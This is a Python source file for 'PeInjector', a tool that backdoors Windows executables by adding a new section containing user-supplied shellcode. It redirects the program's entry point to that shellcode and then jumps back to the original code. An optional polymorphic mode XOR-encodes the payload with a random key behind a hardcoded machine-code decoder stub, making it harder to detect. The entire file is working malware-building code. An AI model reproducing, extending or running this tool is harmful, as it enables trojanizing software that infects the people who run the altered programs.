#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This python tool injects shellcode in Windows Program Executable to
#    backdoor it with optional polymorphism.
#    Copyright (C) 2024  PeInjector

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This python tool injects shellcode in Windows Program Executable to
backdoor it with optional polymorphism.
"""

__version__ = "0.0.2"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This python tool injects shellcode in Windows Program Executable to
backdoor it with optional polymorphism.
"""
__url__ = "https://github.com/mauricelambert/PeInjector"

__all__ = ["main"]

__license__ = "GPL-3.0 License"
__copyright__ = """
PeInjector  Copyright (C) 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
copyright = __copyright__
license = __license__

print(copyright)

from dataclasses import dataclass, field
from os.path import splitext, isfile
from sys import argv, stderr, exit
from base64 import b16decode
from random import randrange
from typing import Tuple


@dataclass
class NewValues:
    image_size: int = 0
    file_size: int = 0
    section_offset: int = 0
    entry_point: int = 0


@dataclass
class Section:
    address_headers: int = 0
    virtual_address: int = 0
    virtual_size: int = 0
    file_offset: int = 0
    file_size: int = 0


@dataclass
class PeInjectorData:
    address_nt_headers: int = 0
    machine_architecture: int = 0
    sections_number: int = 0
    optional_headers_size: int = 0
    entry_point: int = 0
    section_aligment: int = 0
    file_aligment: int = 0
    image_size: int = 0
    image_base: int = 0
    address_new_section_headers: int = 0
    last_section: Section = field(default_factory=Section)
    new_values: NewValues = field(default_factory=NewValues)
    shellcode: bytes = None


machine_types = {
    0x014C: "x86",
    0x8664: "x64",
    0x0200: "IA64",
    0x01C0: "ARM",
    0xAA64: "ARM64",
}


def arg_parse() -> Tuple[str, str, bool]:
    """
    This function parse the command line arguments and returns:
        1. Executable path
        2. Hexadecimal shellcode
        3. Use polymorphism
    """

    if len(argv) == 4:
        if "-p" in argv:
            argv.remove("-p")
        elif "--polymorphism" in argv:
            argv.remove("--polymorphism")
        polymorphism = True
    else:
        polymorphism = False

    if len(argv) != 3:
        print(
            "USAGES: python3",
            argv[0],
            "-p <executable_path> <shellcode_hexadecimal>",
            file=stderr,
        )
        exit(1)

    _, file_path, shellcode = argv

    if not isfile(file_path):
        print(
            "<executable_path>: should be a valid and existing path",
            file=stderr,
        )
        exit(2)

    if any(x not in "0123456789abcdefABCDEF" for x in shellcode):
        print(
            "<shellcode_hexadecimal>: should be a hexadecimal value",
            file=stderr,
        )
        exit(3)

    return file_path, shellcode, polymorphism


def parse_pe_file(executable: str) -> Tuple[memoryview, PeInjectorData]:
    """
    This function parses the PE file.
    """

    with open(executable, "rb") as file:
        data = bytearray(file.read())

    file_mapping = memoryview(data)
    injector_data = PeInjectorData()

    injector_data.address_nt_headers = int.from_bytes(
        file_mapping[0x3C : 0x3C + 4], "little"
    )

    nt_headers = file_mapping[injector_data.address_nt_headers :]
    image_headers = nt_headers[4:]
    injector_data.machine_architecture = int.from_bytes(
        image_headers[0:2], "little"
    )
    injector_data.sections_number = int.from_bytes(
        image_headers[2:4], "little"
    )
    injector_data.optional_headers_size = int.from_bytes(
        image_headers[0x10:0x12], "little"
    )

    optional_headers = nt_headers[0x18:]
    injector_data.entry_point = int.from_bytes(
        optional_headers[0x10:0x14], "little"
    )
    injector_data.section_aligment = int.from_bytes(
        optional_headers[0x20:0x24], "little"
    )
    injector_data.file_aligment = int.from_bytes(
        optional_headers[0x24:0x28], "little"
    )
    injector_data.image_size = int.from_bytes(
        optional_headers[0x38:0x3C], "little"
    )

    section_headers = optional_headers[injector_data.optional_headers_size :]

    if machine_types[injector_data.machine_architecture] == "x64":
        injector_data.image_base = int.from_bytes(
            optional_headers[0x18:0x20], "little"
        )
    elif machine_types[injector_data.machine_architecture] == "x86":
        injector_data.image_base = int.from_bytes(
            optional_headers[0x1C:0x20], "little"
        )
    else:
        print(
            "Invalid architecture: x64 or x86 architecture required, not",
            machine_types[injector_data.machine_architecture],
            file=stderr,
        )
        exit(4)

    injector_data.last_section.address_headers = (
        injector_data.sections_number - 1
    ) * 0x28
    injector_data.address_new_section_headers = (
        injector_data.last_section.address_headers + 0x28
    )
    last_section_headers = section_headers[
        injector_data.last_section.address_headers : injector_data.address_new_section_headers
    ]

    injector_data.last_section.virtual_address = int.from_bytes(
        last_section_headers[0xC:0x10], "little"
    )
    injector_data.last_section.virtual_size = int.from_bytes(
        last_section_headers[0x8:0xC], "little"
    )
    injector_data.last_section.file_offset = int.from_bytes(
        last_section_headers[0x14:0x18], "little"
    )
    injector_data.last_section.file_size = int.from_bytes(
        last_section_headers[0x10:0x14], "little"
    )

    return file_mapping, injector_data


def build_injected_shellcode(
    injector_data: PeInjectorData, polymorphism: bool
) -> None:
    """
    This function generates the injected shellcode.
    """

    original_entry_point = injector_data.entry_point + injector_data.image_base

    last_section_virtual_end_address = (
        injector_data.last_section.virtual_size
        + injector_data.last_section.virtual_address
    )
    virtual_padding = (
        last_section_virtual_end_address % injector_data.section_aligment
    )
    injector_data.new_values.entry_point = last_section_virtual_end_address + (
        (injector_data.section_aligment - virtual_padding)
        if virtual_padding
        else 0
    )

    if machine_types[injector_data.machine_architecture] == "x64":
        # rex_instruction = b"\x48"
        crypter = bytes.fromhex(
            "eb24584889c248054f5f6f7f48c7c1aa0000008"
            "a1830cb881848ffc84839c27ef248ffc0ffe0e8d7ffffff"
        )
    elif machine_types[injector_data.machine_architecture] == "x86":
        # rex_instruction = b""
        crypter = bytes.fromhex(
            "eb1d5889c2054f5f6f7fc7c1aa0000008a183"
            "0cb8818ffc839c27ef440ffe0e8deffffff"
        )

    # injector_data.shellcode += (
    #     rex_instruction + b"\xb8" + original_entry_point + b"\xff\xe0"
    # )

    if polymorphism:
        key = randrange(256)
        shellcode_length = len(injector_data.shellcode) + 5
        crypter = crypter.replace(b"\xaa", key.to_bytes()).replace(
            b"\x4f\x5f\x6f\x7f", shellcode_length.to_bytes(4, "little")
        )
        injector_data.shellcode = crypter + bytes(
            (byte ^ key for byte in injector_data.shellcode)
        )

    suffix = b"\xe9" + (
        original_entry_point
        - (
            injector_data.new_values.entry_point
            + len(injector_data.shellcode)
            + 5
            + injector_data.image_base
        )
    ).to_bytes(4, "little", signed=True)

    if polymorphism:
        injector_data.shellcode += bytes(
            byte ^ key
            for byte in suffix
        )

    injector_data.shellcode += suffix


def inject_section_headers(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
    polymorphism: bool,
) -> int:
    """
    This function inject the section headers.

    This function returns the end address of the last section.
    """

    shellcode_length = len(injector_data.shellcode)
    file_padding = shellcode_length % injector_data.file_aligment
    file_new_section_size = shellcode_length + (
        (injector_data.file_aligment - file_padding) if file_padding else 0
    )

    last_section_file_end_address = (
        injector_data.last_section.file_offset
        + injector_data.last_section.file_size
    )
    file_padding = last_section_file_end_address % injector_data.file_aligment
    injector_data.new_values.section_offset = last_section_file_end_address + (
        (injector_data.file_aligment - (file_padding)) if file_padding else 0
    )

    new_section_headers = b".inject".ljust(
        8, b"\0"
    )  # '.text', '.code', '.init', '.textbss', '.text1', '.itext'
    new_section_headers += shellcode_length.to_bytes(4, "little")
    new_section_headers += injector_data.new_values.entry_point.to_bytes(
        4, "little"
    )
    new_section_headers += file_new_section_size.to_bytes(4, "little")
    new_section_headers += injector_data.new_values.section_offset.to_bytes(
        4, "little"
    )
    new_section_headers += b"\0" * 12
    new_section_headers += (
        0xE0000020 if polymorphism else 0x60000020
    ).to_bytes(4, "little")

    # assert len(new_section_headers) == 0x28

    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
    optional_headers = nt_headers[0x18:]
    section_headers = optional_headers[injector_data.optional_headers_size :]

    section_headers[
        injector_data.address_new_section_headers : injector_data.address_new_section_headers
        + 0x28
    ] = new_section_headers

    injector_data.new_values.image_size = (
        shellcode_length + injector_data.new_values.entry_point
    )
    injector_data.new_values.file_size = (
        file_new_section_size + injector_data.new_values.section_offset
    )

    return last_section_file_end_address


def rewrite_pe_headers(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
) -> None:
    """
    This function writes new value for PE headers.
    """

    nt_headers = memory_file_mapping[injector_data.address_nt_headers :]
    image_headers = nt_headers[4:]
    optional_headers = nt_headers[0x18:]

    image_headers[2:4] = (injector_data.sections_number + 1).to_bytes(
        2, "little"
    )
    optional_headers[0x38:0x3C] = injector_data.new_values.image_size.to_bytes(
        4, "little"
    )
    optional_headers[0x10:0x14] = (
        injector_data.new_values.entry_point.to_bytes(4, "little")
    )


def write_new_pe_file(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
    executable: str,
    last_section_end_address: int,
) -> None:
    """
    This function writes the final shellcode in the new section.
    """

    new_file_content = (
        bytes(memory_file_mapping[:last_section_end_address]).ljust(
            injector_data.new_values.section_offset, b"\xcc"
        )
        + injector_data.shellcode
    ).ljust(injector_data.new_values.file_size, b"\xcc") + bytes(
        memory_file_mapping[last_section_end_address:]
    )

    path, extension = splitext(argv[1])
    new_path = path + "_infected" + extension

    with open(new_path, "wb") as file:
        file.write(new_file_content)


def main() -> int:
    """
    This function starts the program from the command line.
    """

    executable, shellcode, polymorphism = arg_parse()

    memory_file_mapping, injector_data = parse_pe_file(executable)
    injector_data.shellcode = b16decode(argv[2].upper().encode())
    build_injected_shellcode(injector_data, polymorphism)
    last_section_end_address = inject_section_headers(
        injector_data, memory_file_mapping, polymorphism
    )
    rewrite_pe_headers(injector_data, memory_file_mapping)
    write_new_pe_file(
        injector_data,
        memory_file_mapping,
        executable,
        last_section_end_address,
    )

    return 0


if __name__ == "__main__":
    exit(main())
